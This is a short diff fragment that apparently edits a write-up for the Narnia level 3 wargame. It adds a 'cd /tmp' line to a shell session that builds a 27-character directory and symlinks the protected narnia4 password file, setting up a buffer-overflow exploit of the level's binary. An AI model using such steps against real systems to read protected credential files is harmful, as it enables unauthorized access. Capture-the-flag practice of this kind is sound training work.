@@ -62,6 +62,7 @@ int main(int argc, char **argv){
  
         exit(1);
 }  
+narnia3@melinda:~$ cd /tmp  
 narnia3@melinda:/tmp$ mkdir $(python -c 'print "m"*27')  
 narnia3@melinda:/tmp/mmmmmmmmmmmmmmmmmmmmmmmmmmm$ mkdir tmp  
 narnia3@melinda:/tmp/mmmmmmmmmmmmmmmmmmmmmmmmmmm/tmp$ ln -s /etc/narnia_pass/narnia4 /tmp/mmmmmmmmmmmmmmmmmmmmmmmmmmm/tmp/pwd4  
